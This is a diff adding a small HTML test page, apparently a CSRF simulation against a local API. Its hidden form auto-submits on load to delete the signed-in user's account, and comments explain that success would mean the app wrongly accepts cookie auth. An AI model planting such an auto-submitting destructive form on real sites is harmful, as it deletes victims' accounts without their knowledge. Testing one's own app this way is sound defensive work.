@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CSRF Simulation</h1>
+    <p>Attempting to delete account via hidden form...</p>
+    <!-- Assuming an endpoint like /api/v1/users/me/delete exists or similar action -->
+    <form action="http://localhost:8000/api/v1/users/me" method="POST" id="csrf-form">
+        <!-- Browsers do NOT send custom headers like Authorization: Bearer automatically -->
+        <!-- If the app relies SOLELY on headers, this fails (GOOD). -->
+        <!-- If the app supports Cookie-based auth as fallback, this might succeed (BAD). -->
+        <input type="hidden" name="action" value="delete"/>
+        <input type="submit" value="Submit Request"/>
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
